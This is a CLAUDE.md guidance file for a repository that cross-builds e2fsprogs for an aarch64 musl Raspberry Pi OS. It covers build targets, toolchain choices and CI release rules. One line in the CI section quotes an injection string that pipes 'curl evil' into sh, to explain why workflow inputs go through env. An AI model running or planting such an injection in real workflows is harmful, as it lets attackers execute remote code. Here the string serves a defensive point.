# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Status

**The build is implemented and green end to end.** [Makefile](Makefile) fetches the e2fsprogs release tarball, builds a musl sysroot, cross-builds every program the package installs and packs them as a release asset. Verified on macOS/arm64 against messense GCC 15.2.0 and musl 1.2.6: **22 programs and 9 alternate names**, every one AArch64 ELF on `ld-musl-aarch64.so.1` with a `DT_NEEDED` of `libc.so` and nothing else, 5.7 MiB staged and stripped, packing to a **644 KB** `dist/sepiaos-e2fsprogs-1.47.4-aarch64-musl.tar.xz`.

**That is a layout and linkage proof, not a behavioural one.** Nothing has yet *run* any of these programs — that needs a board or an emulator, and until it happens "mke2fs works on the device" is a claim.

**The Linux/bootlin path is proven too**, which it was not in `../make`: the CI job was reproduced locally by running the workflow's own steps inside `debian:trixie-slim` on `linux/amd64` under Docker, and produced the same 22 programs and the same layout from bootlin 2025.08-1 (GCC 14.3.0) — 5.4 MiB staged, a 700 KB asset. The two hosts' assets differ in size because their toolchains do; that is expected, and it is why releases are cut on Linux.

The first real CI run failed, at `toolchain-check`, on the missing `libc6-dev` recorded under CI below. Reproducing the job in the container is cheap and worth doing before pushing a workflow change:

```sh
docker run -d --platform linux/amd64 --name e2fs-ci debian:trixie-slim sleep infinity
git ls-files | COPYFILE_DISABLE=1 tar --no-mac-metadata --no-xattrs -cf - -T - | docker cp - e2fs-ci:/src
docker exec e2fs-ci sh -c 'apt-get update -qq && apt-get install -y -qq --no-install-recommends \
  make git curl ca-certificates xz-utils gcc libc6-dev'
docker exec e2fs-ci sh -c 'cd /src && make toolchain toolchain-check sources sysroot \
  verify-downloads sysroot-check e2fsprogs stage stage-check dist'
```

`--platform linux/amd64` is not optional: bootlin publishes x86_64-hosted toolchains only, so an arm64 container hits the Makefile's "no prebuilt toolchain for this host" error and proves nothing. Nor is copying the tree in with `docker cp` rather than bind-mounting it — `../rootfs` records a bind-mounted build failing inside e2fsprogs with *"chmod: changing permissions of 'compile_et': Permission denied"*, an artifact of Docker Desktop's shared filesystem. `--no-mac-metadata --no-xattrs` keeps `docker cp` from choking on `com.apple.provenance`.

What does not exist yet: any consumer in `../rootfs` (it still cross-builds its own `resize2fs` from its own e2fsprogs tree).

## Commands

```sh
gmake help                  # every target, with the variables that steer them
gmake toolchain-check       # compile and link C against musl, both ways, plus the host compiler
gmake sysroot-check         # prove C links dynamically against build/sysroot
gmake e2fsprogs             # configure out of tree and build the program directories
gmake stage-check           # every program: aarch64, musl loader, musl and nothing else
gmake dist                  # dist/sepiaos-e2fsprogs-<version>-aarch64-musl.tar.xz
gmake <thing>-info          # what version, from where, how big
gmake clean                 # drop build/, keep downloads/
gmake -s print-DIST_ASSET   # read any variable's value
```

`gmake e2fsprogs` is the aggregate goal — the target is named after the product, as `../make`'s is named `make` and `../llvm`'s `llvm`.

**A full build with no toolchain in `downloads/` fetches a few hundred MiB.** To iterate without that, point `CROSS_COMPILE` at a toolchain a sibling already extracted — this is how the build was verified:

```sh
gmake CROSS_COMPILE=../llvm/downloads/toolchain/messense-15.2.0-aarch64-darwin/bin/aarch64-unknown-linux-musl- stage-check
```

`stage-check` is the fast regression gate: from a clean `build/`, the toolchain check, the sources and the musl sysroot take ~32 s and e2fsprogs itself ~22 s on an 8-core machine. Editing the `Makefile` re-runs the musl build, because `Makefile` is a prerequisite of the sysroot per the house rule that editing a recipe rebuilds what it builds.

## What This Repository Is For

SepiaOS is an operating system for Raspberry Pi that reuses the kernel and firmware from Raspberry Pi OS; everything above the kernel is custom. Targets: Pi Zero 2 W, Pi 3, Pi 4, Pi 5, CM4, CM5.

The repositories are checked out side by side and opened together via [../SepiaOS.code-workspace](../SepiaOS.code-workspace). Each pushes to `git@github.com:Sepia-OS/<name>.git`:

| | |
|---|---|
| [../boot](../boot) | the FAT boot partition — complete, released, CI'd. The smallest and clearest model of the house style. |
| [../rootfs](../rootfs) | the ext4 root filesystem: cross-toolchain, musl, busybox, kernel modules, bootable image. Complete. |
| [../llvm](../llvm) | clang/lld cross-built to run *on* the Pi, against musl. Complete and released. |
| [../make](../make) | GNU `make`, the same way. Complete. |
| [../spm](../spm) | the SepiaOS package manager, in Rust. Early. |
| `.` (this repo) | the e2fsprogs filesystem tools, the same way. |

This builds e2fsprogs **for the device, not for the build host**: aarch64 binaries that run on the Pi. `../llvm` gives the card a compiler, `../make` a build driver, and this gives it the tools to create, check, resize and inspect its own filesystems.

**Do not confuse this with what `../rootfs` does with e2fsprogs.** That repository builds the same sources twice for reasons of its own: a *host* `mke2fs`/`debugfs`/`e2fsck` that creates the ext4 image on the developer's machine, and a *target* `resize2fs` because first boot has to grow the root partition and busybox has no applet for it. Neither is this package. If `rootfs` ever consumes this release, its target build goes away and its host build does not.

## Decisions Already Taken

Each of these was open when the Makefile was written, and each is settled with evidence. Do not re-open them without new evidence.

- **All the programs, not a subset.** That is the request this repository exists to answer. The one exception is `fuse2fs`, which needs libfuse; the card has none, so `--disable-fuse2fs` is explicit rather than left to configure's probe.
- **The libraries are static — no `--enable-elf-shlibs`.** Every program then carries the parts of libext2fs it uses and depends on musl alone, which is the invariant `../llvm` and `../make` hold to. Shared libraries would save ~2 MiB of the 5.7 MiB tree and turn one missing `.so` into a card where nothing in the package runs. `stage-check` reads all 22 back and asserts the closure.
- **Upstream's Linux layout, via `--with-root-prefix=''`.** `/sbin` for what a system needs before `/usr` is mounted, `/usr/sbin` and `/usr/bin` for the rest, `/etc/mke2fs.conf`. On SepiaOS `/` and `/usr` are one filesystem so it is convention rather than necessity — but it is the convention every other e2fsprogs follows.
- **Upstream's own `make install` under `DESTDIR`**, not a hand-written list of files to copy. `../make` copies its one binary because upstream's install path cannot work there; here the install path works, and a list would have to be kept in step with every new release.
- **The version is pinned, not resolved.** `../rootfs` asks the release index for the latest e2fsprogs, which is right for a tool it builds and throws away. A release asset has to say which version it is and CI has to build the same thing twice, so `E2FSPROGS_VERSION` is a pin with a committed digest.
- **The tarball is checked twice**: against kernel.org's `sha256sums.asc`, whose digest lines are already in `sha256sum --check` format, and against `checksums/e2fsprogs-1.47.4.sha256`, so the pin still means something without a network. `musl-1.2.6.sha256` is byte-identical to the one in `../llvm`, `../make` and `../rootfs` — that is the cross-repo invariant working.

## Non-Obvious Constraints

All established by running the build, and each one silently produces a broken or confusing result if violated:

- **`--disable-subset` does not disable anything.** `SUBSET_CMT` is used in exactly one place in the whole tree — the `$(MAKE) install-libs` line at the end of the top-level `install` target — and configure leaves it *empty* unless the flag is given. So a plain `make install` also installs the headers, the six static libraries, the `.pc` files and `compile_et`/`mk_cmds`. That is what `WITH_DEVEL` is for, so the flag turns it off and `WITH_DEVEL=1` calls `install-libs` explicitly. Measured: 8.0 MiB staged before, 5.7 MiB after.
- **`--enable-symlink-install` is about `strip`, not about tidiness.** `mke2fs` is installed once and linked to `mkfs.ext2/3/4`, `e2fsck` to `fsck.ext2/3/4`, `tune2fs` to `e2label` and `findfs`, `dumpe2fs` to `e2mmpstatus`. Upstream's default is `ln -f` — *hard* links — and binutils `strip` does not edit in place: it writes a temporary file and renames it over the original, which breaks the link and leaves four separate 750 KB copies of `e2fsck`. With `-sf` they are symlinks to a bare name in the same directory, which resolve inside the staged tree and on the device, and which `find -type f` skips so each program is stripped exactly once.
- **`progs`, not `all`.** `all` also descends into `tests/progs` and `tests/fuzz`; upstream installs none of them and — as `../rootfs` records — several do not cross-link at all. `PROG_SUBDIRS` is overridden on the `make` command line rather than the tree patched, and the *same* override is given to `install` so build and install agree about what exists.
- **A host C compiler is required, and `../make`'s CI package list is therefore wrong here.** e2fsprogs compiles and runs helper programs on the build machine: `util/subst` generates config files, `lib/ext2fs` generates its CRC32c table, and configure runs `util/parse-types.sh` through `BUILD_CC` to parse the *target's* types. `toolchain-check` proves the host compiler works before anything expensive, because the failure otherwise arrives as a missing `util/subst` two minutes in.
- **`--prefix=/usr` alone puts everything under `/usr`.** configure only defaults `root_prefix` to `''` when `prefix` is `NONE`; give it a prefix and `root_prefix` follows it, so `/sbin/mke2fs` becomes `/usr/sbin/mke2fs`. `--with-root-prefix=''` is what restores the normal layout.
- **`debugfs` installs into `root_sbindir`, i.e. `/sbin`** — not `/usr/sbin` with the other non-essential tools. This was found by `stage-check` failing on a wrong assumption; do not "correct" it back.
- **udev, cron and systemd are answered explicitly.** Left alone, configure probes the *build host* — pkg-config for udev, `/etc/cron.d` for cron — so a Debian container would install crontabs and udev rules that a macOS box would not, and the two release assets would differ by build host. `--without-udev-rules-dir --without-crond-dir --without-systemd-unit-dir` makes the answer the same everywhere.
- **The `docs` half of `install` fails and is meant to.** `install-doc-libs` is prefixed with `-` in upstream's Makefile, so a missing `makeinfo` and `texi2dvi` produce "Error 127 (ignored)" and an empty `/usr/share/info` in the log. The recipe removes that directory unconditionally rather than depending on whether the build machine happens to have texinfo.
- **`e2initrd_helper` is built by default.** `--enable-e2initrd-helper` reads like an opt-in; configure's default case builds it anyway. It ships (in `/usr/lib`), because "all the programs" is this repository's job, and because `../rootfs` passing `--disable-e2initrd-helper` is about its own minimal build, not about this one.
- **`etc/mke2fs.conf` is not documentation.** Without it `mke2fs` has no filesystem profiles and will not create anything. `stage-check` asserts it is there, and the staged tree is wiped before every install so upstream never takes the `mke2fs.conf.e2fsprogs-new` branch it uses when it finds a config it did not write.
- **The staged tree needs its own signature.** `WITH_STRIP`, `WITH_DEVEL`, `WITH_MANPAGES`, `WITH_E2SCRUB`, `PREFIX` and `ROOT_PREFIX` change what lands in it without changing any file it is built from. `WITH_E2SCRUB` is in `BUILD_SIG` as well, because it also changes `PROG_SUBDIRS`. Any new variable that changes what ships must go into one or both.
- **`stage-check` proves linkage and layout, and nothing else.** It reads every ELF in the tree — header, interpreter and full `DT_NEEDED` closure — and asserts the symlinks and `mke2fs.conf` are in place. It does not run anything, and nothing here can. `../llvm` shipped a libc++ whose `DT_NEEDED libatomic.so.1` referenced no symbol at all and killed every program at exec on a card without it; the closure check exists because of that.
- **`e2scrub` is off, and it is scripts rather than programs.** `e2scrub` and `e2scrub_all` drive lvm2 to snapshot a filesystem and fsck it, and want bash, lvm2, udev and either systemd or cron. SepiaOS has none of them, so shipping them would add two commands that can only fail. `WITH_E2SCRUB=1` adds `scrub` to `PROG_SUBDIRS` and ships them anyway; it builds and installs cleanly, it is just not useful here.

## The Toolchain

Read out of `../llvm/Makefile` and `../make/Makefile`, where it was established by experiment. Do not "simplify" it:

- **The toolchain is the musl-targeting one, and it differs by build host** — messense publishes darwin-hosted builds only, bootlin (Buildroot) publishes Linux-hosted x86_64 builds only. Both are fetched by one recipe differing only in `TC_PREFIX`, `TC_ARCHIVE`, `TC_URL` and `TC_SUMS`, with `CROSS_COMPILE` as the escape hatch.
- **`aarch64-unknown-linux-musl` is pinned, not inherited.** The vendors disagree — bootlin's compiler calls itself `aarch64-buildroot-linux-musl` — and an artifact whose target depended on which machine cut the release would be confusing.
- **Do not use `../rootfs`'s toolchain.** It is `aarch64-unknown-linux-gnu` GCC. e2fsprogs is C, so it would build — but against glibc, and these binaries have to link against the musl that is on the card.
- **The sysroot is musl plus UAPI headers.** musl installs libc headers and nothing else, and e2fsprogs needs more kernel headers than most: `linux/fs.h`, `linux/fiemap.h`, `linux/falloc.h`, `linux/fsmap.h`, `linux/loop.h`, `linux/blkzoned.h`. They are copied from the cross-toolchain's own `-print-sysroot`, so this costs nothing and cannot drift from the compiler. The `install_uapi_headers` check asks for `linux/fiemap.h` rather than `linux/kd.h` for that reason.
- **Never ship a libc.** `dist` refuses to pack a tree containing `libc.so*` or `ld-musl-*`: the card's musl comes from `rootfs`, and a second copy is two libcs disagreeing.
- **musl is pinned to what `rootfs` ships.** `rootfs` resolves it as "latest" by default, so it can move out from under this pin; when it moves, `../llvm`, `../make` and this repository all move with it.

## Conventions Inherited

Verified across `../boot`, `../rootfs`, `../llvm` and `../make`, and followed here:

- **`gmake`, not `make`.** Hard error below GNU Make 4.0 — macOS's 3.81 compares timestamps only to the second and silently reuses stale outputs after a fast edit.
- **Nothing needs root**, on macOS or Linux.
- **Directory split:** `downloads/` (immutable upstream artifacts, survive `clean`), `build/` (everything generated, including the unpacked source tree and the out-of-tree build), `dist/`, `checksums/`.
- **A variable override touches no file, so Make cannot see it.** Hence the `FORCE` + `cmp -s` signature stamps. `gmake -n` **cannot** test this — `FORCE` makes every stamp look dirty under dry-run, so both cases look identical.
- **Target naming:** an aggregate goal, plus `<thing>-info` and `<thing>-check`. Every aggregate goal ends with a `READY` line whether or not anything was rebuilt — a satisfied phony goal otherwise prints nothing, which reads exactly like a broken target.
- **The `help` target's grep pattern must allow digits.** `../make`'s is `^[a-zA-Z_-]+`, which silently omits any target with a digit in its name — including `e2fsprogs`, the product goal.
- **`print-%` exposes any variable to CI**, which makes the names it is called with a CI contract: `DIST_ASSET`, `E2FSPROGS_VERSION`, `MUSL_VERSION`, `TARGET_TRIPLE`, `TC_VENDOR`, `TC_VERSION`.
- **`.SHELLFLAGS := -eu -o pipefail`.** A bare `grep` that matches nothing aborts the recipe, and a pipeline ending in `head` or `grep -m1` SIGPIPEs its producer and **fails after printing the right answer** — `musl_version_of` reads in two steps for exactly that reason.
- **ELF files are recognised by their magic, not by `file`.** `file` is not in `debian:trixie-slim`, and BSD and GNU `file` word their answers differently. `od -An -N4 -tx1` compared against `7f454c46` works on both hosts.
- **Noisy tools log to a file and only their tail surfaces on failure** (`configure.log`, `build.log`). CI uploads those, plus `config.log`, or a failure is 30 lines out of thousands.
- **The `.gitignore` deliberately omits the stock toptal C/C++ section.** Its `*.d` pattern also matches *directories* named `*.d`, which is how `../rootfs` silently failed to commit `overlay/etc/init.d`. Keep it omitted.
- **Apache 2.0** for this repository; the packaged e2fsprogs is GPLv2 with LGPLv2, MIT and BSD-licensed libraries, and its `NOTICE` and `lib/uuid/COPYING` ship inside the release asset.
- **`README.md` is the specification and stays in sync.** Changing a target, a variable or a default means updating it in the same change.

## CI and Releases

Both files are the `../make` pair with the differences this package forces; `../boot/docs/CI.md` is the full reasoning:

- **`ci.yml` builds on every commit on every branch and every PR against `main`**, in `debian:trixie-slim`. This build is under a minute of compute, so there is no reason to narrow it.
- **The package list is `../make`'s plus `gcc` and `libc6-dev`**, for `BUILD_CC`. Keep the two workflows' lists identical to each other, or a release builds in a container CI never tested.
- **`libc6-dev` is not implied by `gcc`.** Debian's `gcc` merely *recommends* it, and both workflows install with `--no-install-recommends`, so the first CI run got a `cc` that ran, linked a static binary and then died on `#include <stdio.h>`. `assert_build_cc` now preprocesses a one-line program through `BUILD_CC` and names the package, so the same mistake on a development machine fails in a second with an answer instead of somewhere inside e2fsprogs' build.
- **Build tools go in *before* `actions/checkout`.** Without `git` in the container, checkout silently degrades to a tarball download.
- **`verify-downloads` runs after `sysroot`, not before.** Unlike `../make`'s, it checks the musl tarball as well as the package sources, and musl is not downloaded until the sysroot is built.
- **Workflows call only documented `make` targets**, so any CI failure reproduces locally verbatim.
- **Releases are never automatic.** Manual `workflow_dispatch` takes a version; a `gate` job validates it, resolves `main`'s head **once**, refuses a commit with no green CI run for that exact commit, and branches `main` to `rel-<version>`; `build` runs on that branch; `rollback` deletes it if the build fails. Every release is kept — the asset is 644 KB.
- **`inputs.version` reaches bash through `env:`, never `${{ }}` interpolation into a script line** — the substitution happens before bash parses it, so `x"; curl evil | sh; #` would otherwise run. Validate against `^[0-9][0-9A-Za-z.+-]*$`.
- Only the publishing job gets `contents: write`; `GITHUB_TOKEN` is the only credential needed.
- The Linux container gets the **bootlin** toolchain, which this build has never exercised — macOS was the development host. Expect the first CI run to be where that path is proven.

## Build Environment

The user develops on **macOS** (`darwin`) with the repositories under `~/Projects/RaspberryPi/SepiaOS/`.

- **`gmake` (`brew install make`)**, not `/usr/bin/make`.
- Binaries built on macOS and on Linux are not byte-identical, so — as `../rootfs` states outright — **macOS is the development host and release builds are cut on Linux**.
- Required tools: `gmake`, `curl`, `tar`, `xz`, and a host C compiler (`cc`). The host compiler is the one prerequisite `../make` does not have.
